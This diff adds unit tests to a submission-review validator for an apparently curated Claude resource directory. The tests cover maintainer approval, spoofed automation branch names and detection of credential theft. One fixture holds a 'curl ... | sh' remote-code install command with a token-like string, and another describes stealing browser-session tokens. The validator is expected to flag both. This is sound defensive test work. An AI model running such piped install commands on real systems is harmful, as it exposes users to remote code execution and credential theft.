@@ -148,6 +148,55 @@ Native macOS MCP server.`);
     expect(buildSubmissionFieldModel("prompts")).toBeNull();
   });
 
+  it("requires maintainer approval before tools listings enter the PR-first queue", () => {
+    const draft = buildSubmissionPrDraft({
+      name: "Acme Sponsored Claude Platform",
+      slug: "acme-sponsored-claude-platform",
+      category: "tools",
+      description:
+        "Paid SaaS platform with sponsored placement for Claude workflow teams.",
+      card_description: "Paid Claude workflow platform.",
+      website_url: "https://example.com/product",
+      docs_url: "https://example.com/docs",
+      pricing_model: "paid",
+      disclosure: "sponsored",
+      application_category: "Hosted platform",
+      operating_system: "Web",
+    });
+
+    const validation = validateSubmission(draft);
+
+    expect(validation.ok).toBe(false);
+    expect(validation.errors.join("\n")).toContain(
+      "not merged from the free resource queue without maintainer approval",
+    );
+  });
+
+  it("allows maintainer-accepted tools listings to keep existing metadata validation", () => {
+    const draft = {
+      ...buildSubmissionPrDraft({
+        name: "Maintainer Reviewed Claude Tool",
+        slug: "maintainer-reviewed-claude-tool",
+        category: "tools",
+        description:
+          "Editorially reviewed Claude tool with complete listing metadata.",
+        card_description: "Reviewed Claude tool listing.",
+        website_url: "https://example.com/product",
+        docs_url: "https://example.com/docs",
+        pricing_model: "free",
+        disclosure: "editorial",
+        application_category: "Developer tool",
+        operating_system: "Web",
+      }),
+      labels: [{ name: "accepted" }],
+    };
+
+    const validation = validateSubmission(draft);
+
+    expect(validation.ok).toBe(true);
+    expect(validation.errors).toEqual([]);
+  });
+
   it("blocks affiliate, referral, and unsafe source signals during draft risk review", () => {
     const draft = buildSubmissionPrDraft({
       ...validMcpFields,
@@ -217,6 +266,44 @@ Native macOS MCP server.`);
     ).toContain("unsafe_package_verified_true");
     expect(directContentRequestChangesReasons(report).join("\n")).toContain(
       "packageVerified",
+    );
+  });
+
+  it("does not let fork PR branch names spoof automation imports", () => {
+    const report = analyzeDirectContentRisk({
+      pullRequest: {
+        number: 125,
+        title: "content(mcp): add spoofed automation import",
+        user: { login: "contributor" },
+        head: {
+          ref: "automation/submission-123-spoofed",
+          repo: { full_name: "contributor/awesome-claude" },
+        },
+        base: { repo: { full_name: "JSONbored/awesome-claude" } },
+      },
+      files: [
+        sourceFile(
+          validMcpMdx({
+            title: "Spoofed Automation Import MCP",
+            slug: "spoofed-automation-import",
+            installCommand:
+              "curl http://example.com/install.sh | sh # ghp_1234567890abcdef1234567890abcdef1234",
+            safetyNotes: [],
+            privacyNotes: [],
+          }),
+          "content/mcp/spoofed-automation-import.mdx",
+        ),
+        { filename: "README.md", status: "modified", content: "# Edited\n" },
+      ],
+    });
+
+    expect(report.subject?.sourceType).toBe("external_direct");
+    const reasons = directContentRequestChangesReasons(report).join("\n");
+    expect(reasons).toContain(
+      "Install instructions include a destructive or remote-code execution pipeline",
+    );
+    expect(reasons).toContain(
+      "Direct contributor PRs should not edit README.md",
     );
   });
 
@@ -318,6 +405,43 @@ Native macOS MCP server.`);
             ],
           }),
           "content/hooks/credential-audit-hook.mdx",
+        ),
+      ],
+    });
+
+    expect(report.reviewFlags.map((flag) => flag.id)).toContain(
+      "malicious_data_theft_capability",
+    );
+    expect(directContentRequestChangesReasons(report).join("\n")).toContain(
+      "credential, token, session, or wallet theft",
+    );
+  });
+
+  it("keeps credential-theft request changes for explicit stealing claims with defensive wording", () => {
+    const report = analyzeDirectContentRisk({
+      pullRequest: {
+        number: 131,
+        title: "content(hooks): add credential audit notes",
+        user: { login: "contributor" },
+        head: { repo: { full_name: "contributor/awesome-claude" } },
+        base: { repo: { full_name: "JSONbored/awesome-claude" } },
+      },
+      files: [
+        sourceFile(
+          validMcpMdx({
+            title: "Credential Audit Notes",
+            slug: "credential-audit-notes",
+            category: "hooks",
+            description:
+              "Prevent errors with audit notes; steal tokens from browser sessions.",
+            repoUrl: "https://github.com/example/credential-audit-notes",
+            docsUrl: "https://example.com/credential-audit-notes",
+            safetyNotes: [
+              "Reviews browser session behavior before commands run.",
+            ],
+            privacyNotes: ["Reads token material from user browser sessions."],
+          }),
+          "content/hooks/credential-audit-notes.mdx",
         ),
       ],
     });
